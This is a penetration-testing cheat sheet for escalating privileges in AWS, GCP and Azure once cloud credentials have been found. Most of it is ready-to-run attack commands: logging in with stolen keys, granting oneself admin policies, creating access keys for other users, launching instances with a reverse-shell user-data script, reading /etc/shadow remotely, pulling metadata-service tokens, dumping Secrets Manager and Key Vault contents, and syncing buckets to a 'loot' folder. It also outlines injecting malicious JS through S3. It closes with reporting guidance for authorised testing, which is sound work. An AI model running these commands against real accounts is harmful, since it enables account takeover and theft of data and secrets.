# Cloud Privilege Escalation & Exploitation

AWS, GCP, and Azure privilege escalation techniques for post-compromise scenarios. Use during Phase 6/7 when cloud credentials are discovered (heapdumps, SSRF, JS bundles, .env files).

---

## AWS

### IAM Key Prefix Identification

| Prefix | Meaning | Implication |
|--------|---------|-------------|
| AKIA | Permanent access key | Long-lived, check for rotation |
| ASIA | Temporary (STS) key | Short-lived, needs session token |
| AIDA | IAM user | User identity |
| AROA | Role | Role identity |
| AGPA | Group | Group identity |
| ANPA | Managed policy | Policy ARN |

### First Steps After Credential Discovery

```bash
# 1. Identify who you are
aws sts get-caller-identity
# Returns: Account, UserId, Arn

# 2. If temporary credentials (ASIA*), set all three:
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# 3. Enumerate permissions (stealth — no CloudTrail for these)
# https://github.com/andresriancho/enumerate-iam
python enumerate-iam.py --access-key "$AWS_ACCESS_KEY_ID" --secret-key "$AWS_SECRET_ACCESS_KEY"

# 4. Check account ID from access key (no auth needed!)
aws sts get-access-key-info --access-key-id=AKIA1234567890123456
```

### S3 Exploitation

```bash
# List all buckets
aws s3 ls
aws s3api list-buckets

# List bucket contents
aws s3 ls s3://bucket-name --recursive
aws s3api list-objects-v2 --bucket bucket-name

# Download everything
aws s3 sync s3://bucket-name ./loot/

# Check bucket ACL (who has access)
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name

# Test write access
aws s3 cp test.txt s3://bucket-name/pentest-probe.txt
# If succeeds → can inject JS into S3-hosted static sites

# Public bucket enumeration
# https://buckets.grayhatwarfare.com
# Google dork: site:.s3.amazonaws.com "CompanyName"
```

### S3 Attack Scenarios

```text
1. S3 Code Injection:
   - Find writable S3 bucket serving JS to webapp
   - Upload malicious JS → XSS on all visitors
   - Real case: AOL ad platform → MSN homepage crypto-miner (2018)

2. S3 Domain Hijacking:
   - Find 404 "NoSuchBucket" on subdomain CNAME → S3
   - Create bucket with same name + region
   - Serve malicious content on victim's subdomain

3. S3 Data Exfiltration:
   - Backup buckets often have weak ACLs
   - Look for: *-backup, *-logs, *-archive, *-data
```

### IAM Privilege Escalation

```bash
# List your policies
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)
aws iam list-user-policies --user-name USERNAME

# Get policy details (look for Action: * or Resource: *)
aws iam get-policy-version --policy-arn POLICY_ARN --version-id $(aws iam get-policy --policy-arn POLICY_ARN --query 'Policy.DefaultVersionId' --output text)

# Dangerous permissions that enable privesc:
# iam:CreateUser / iam:CreateLoginProfile / iam:UpdateLoginProfile
# iam:AddUserToGroup (add self to admin group)
# iam:AttachUserPolicy / iam:PutUserPolicy (give self admin)
# iam:CreateAccessKey (create keys for other users)
# iam:PassRole + ec2:RunInstances (launch EC2 with admin role)
# iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
# sts:AssumeRole (assume more privileged role)

# Automated privesc check
# https://github.com/RhinoSecurityLabs/pacu
python3 pacu.py
> import_keys --all
> run iam__privesc_scan
```

### IAM Privesc Techniques

```bash
# 1. Create new access key for another user
aws iam create-access-key --user-name admin-user

# 2. Add self to admin group
aws iam add-user-to-group --user-name attacker --group-name Admins

# 3. Attach admin policy to self
aws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 4. Create new policy version (if iam:CreatePolicyVersion)
aws iam create-policy-version --policy-arn POLICY_ARN --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' --set-as-default

# 5. PassRole + Lambda (create function with admin role)
aws lambda create-function --function-name privesc --runtime python3.9 --role arn:aws:iam::ACCOUNT:role/AdminRole --handler lambda_function.handler --zip-file fileb://payload.zip
aws lambda invoke --function-name privesc output.txt

# 6. PassRole + EC2 (launch instance with admin role)
aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro --iam-instance-profile Name=AdminProfile --user-data file://reverse-shell.sh

# 7. AssumeRole chain (role juggling)
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/MorePrivilegedRole --role-session-name privesc
```

### EC2 Exploitation

```bash
# List instances
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]' --output table

# SSM command execution (if ssm:SendCommand)
aws ssm send-command --instance-ids "i-xxx" --document-name "AWS-RunShellScript" --parameters commands="whoami;id;cat /etc/shadow"
aws ssm list-command-invocations --command-id "CMD_ID" --details

# EC2 user data (often contains secrets)
aws ec2 describe-instance-attribute --instance-id i-xxx --attribute userData --query UserData.Value --output text | base64 -d

# Modify user data (if ec2:ModifyInstanceAttribute — requires stop/start)
# Inject reverse shell into user data → restart instance

# Security group enumeration (find exposed services)
aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values='0.0.0.0/0' --query "SecurityGroups[*].[GroupName,GroupId]" --output table
```

### Lambda Exploitation

```bash
# List functions
aws lambda list-functions --query 'Functions[].[FunctionName,Runtime,Role]' --output table

# Get function code
aws lambda get-function --function-name NAME --query 'Code.Location' --output text | xargs wget -O function.zip

# Environment variables (often contain secrets)
aws lambda get-function-configuration --function-name NAME --query 'Environment.Variables'

# Invoke function (test for command injection)
aws lambda invoke --function-name NAME --payload '{"cmd":"id"}' output.json

# If SSRF into Lambda: read /proc/self/environ for credentials
```

### EBS/Snapshot Exploitation

```bash
# Find public snapshots (data leaks)
aws ec2 describe-snapshots --restorable-by-user-ids all --query 'Snapshots[].[SnapshotId,Description,OwnerId]' --output table | grep -i "company"

# Create volume from snapshot, attach, mount, loot
aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a
aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/sdh
# SSH to instance:
sudo mount /dev/xvdh1 /mnt && ls /mnt/
```

### Secrets Manager / Parameter Store

```bash
# List secrets
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME

# SSM Parameter Store
aws ssm describe-parameters
aws ssm get-parameters --names PARAM_NAME --with-decryption
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
```

### EKS (Kubernetes on AWS)

```bash
# List clusters
aws eks list-clusters
aws eks describe-cluster --name CLUSTER_NAME

# Get kubeconfig
aws eks update-kubeconfig --name CLUSTER_NAME

# Then standard K8s exploitation
kubectl get secrets --all-namespaces
kubectl get pods --all-namespaces
```

---

## GCP

### First Steps

```bash
# Authenticate with stolen service account key
gcloud auth activate-service-account --key-file=key.json

# Or set access token directly
export CLOUDSDK_AUTH_ACCESS_TOKEN="ya29.xxx"

# Identify yourself
gcloud auth list
gcloud config get-value project

# Metadata endpoint (from compromised instance)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### GCP Privilege Escalation

```bash
# List IAM policies
gcloud projects get-iam-policy PROJECT_ID

# Service account key creation (if iam.serviceAccountKeys.create)
gcloud iam service-accounts keys create key.json --iam-account=SA@PROJECT.iam.gserviceaccount.com

# Service account impersonation (if iam.serviceAccounts.getAccessToken)
gcloud auth print-access-token --impersonate-service-account=ADMIN_SA@PROJECT.iam.gserviceaccount.com

# Compute instance with service account (if compute.instances.create + iam.serviceAccounts.actAs)
gcloud compute instances create privesc --service-account=ADMIN_SA@PROJECT.iam.gserviceaccount.com --scopes=cloud-platform --zone=us-central1-a

# Cloud Functions (if cloudfunctions.functions.create)
# Deploy function with admin SA → execute arbitrary code as admin
```

### GCP Storage

```bash
# List buckets
gsutil ls
gsutil ls gs://bucket-name/

# Download
gsutil cp gs://bucket-name/secret.txt .
gsutil -m cp -r gs://bucket-name/ ./loot/

# Check ACL
gsutil iam get gs://bucket-name/
```

---

## Azure

### First Steps

```bash
# Login with stolen credentials
az login -u user@domain.com -p password
# Or with service principal
az login --service-principal -u APP_ID -p SECRET --tenant TENANT_ID

# Identify yourself
az account show
az ad signed-in-user show

# Metadata endpoint (from compromised VM)
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### Azure Privilege Escalation

```bash
# List role assignments
az role assignment list --all

# If Owner/User Access Administrator:
az role assignment create --assignee ATTACKER_ID --role "Contributor" --scope /subscriptions/SUB_ID

# Key Vault secrets
az keyvault list
az keyvault secret list --vault-name VAULT_NAME
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME

# Storage account keys
az storage account keys list --account-name ACCOUNT_NAME

# VM command execution (if Microsoft.Compute/virtualMachines/runCommand)
az vm run-command invoke --resource-group RG --name VM_NAME --command-id RunShellScript --scripts "whoami && cat /etc/shadow"
```

---

## Tools Summary

| Tool | Platform | Purpose |
|------|----------|---------|
| [Pacu](https://github.com/RhinoSecurityLabs/pacu) | AWS | Exploitation framework (privesc, enum) |
| [ScoutSuite](https://github.com/nccgroup/ScoutSuite) | Multi-cloud | Security auditing |
| [Prowler](https://github.com/prowler-cloud/prowler) | AWS/GCP/Azure | Compliance + security checks |
| [enumerate-iam](https://github.com/andresriancho/enumerate-iam) | AWS | Permission enumeration |
| [WeirdAAL](https://github.com/carnal0wnage/weirdAAL) | AWS | Recon + exploitation |
| [CloudSplaining](https://github.com/salesforce/cloudsplaining) | AWS | IAM policy analysis |
| [PMapper](https://github.com/nccgroup/PMapper) | AWS | IAM privilege graph |
| [aws_consoler](https://github.com/NetSPI/aws_consoler) | AWS | Generate console URL from keys |
| [cloud_enum](https://github.com/initstring/cloud_enum) | Multi-cloud | Bucket/blob enumeration |
| [GCPBucketBrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute) | GCP | Bucket enumeration |
| [ROADtools](https://github.com/dirkjanm/ROADtools) | Azure AD | Azure AD enumeration |

---

## Decision Tree: Cloud Credential Found

```text
Credential discovered (heapdump, .env, JS bundle, SSRF)
│
├── What type?
│   ├── AWS Access Key (AKIA/ASIA) → aws sts get-caller-identity
│   ├── GCP Service Account JSON → gcloud auth activate-service-account
│   ├── Azure Client Secret → az login --service-principal
│   └── Generic token → try all three, check JWT claims
│
├── Enumerate permissions (FIRST — before exploitation)
│   ├── AWS: enumerate-iam.py or manual iam list-*
│   ├── GCP: gcloud projects get-iam-policy
│   └── Azure: az role assignment list
│
├── Quick wins (low-noise)
│   ├── Secrets Manager / Key Vault / Parameter Store
│   ├── S3/GCS/Blob storage listing
│   ├── Environment variables (Lambda, Cloud Functions)
│   └── Database connection strings
│
├── Privilege escalation (if needed)
│   ├── AWS: PassRole, CreatePolicyVersion, AssumeRole
│   ├── GCP: serviceAccountKeys.create, actAs
│   └── Azure: Role assignment, Key Vault access
│
└── Document scope of access
    ├── What data is accessible?
    ├── What actions can be performed?
    ├── Cross-account/cross-project access?
    └── Lateral movement paths?
```

---

## Reporting Guidance

**Severity for cloud findings:**
- Stolen credentials with admin/owner access → **Critical**
- Stolen credentials with read access to secrets/PII → **High**
- Stolen credentials with limited read access → **Medium**
- Public S3 bucket with sensitive data → **High**
- Public S3 bucket with non-sensitive data → **Low**
- Privesc path exists (not exploited) → **High** (document the path)
- Metadata endpoint accessible via SSRF → **Critical** (leads to credential theft)

**Key principle:** Cloud credential theft often has WIDER blast radius than traditional server compromise. A single leaked IAM key can access hundreds of services across multiple regions. Always document the full scope of what the credential COULD access, not just what you accessed during testing.
